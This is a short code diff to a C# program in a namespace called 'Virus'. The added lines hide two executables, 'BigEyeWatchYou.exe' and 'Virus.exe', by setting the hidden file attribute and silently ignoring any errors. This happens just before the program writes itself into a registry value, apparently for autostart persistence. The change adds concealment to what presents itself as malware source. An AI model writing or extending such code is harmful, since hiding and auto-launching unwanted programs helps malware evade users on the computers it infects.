@@ -72,6 +72,13 @@ namespace Virus
 
             if (rk.GetValue(appName) == null)
             {
+                try
+                {
+                    File.SetAttributes("BigEyeWatchYou.exe", FileAttributes.Hidden);
+                    File.SetAttributes("Virus.exe", FileAttributes.Hidden);
+                }
+                catch { }
+
                 rk.SetValue(appName, appFullPath);
             }
         }
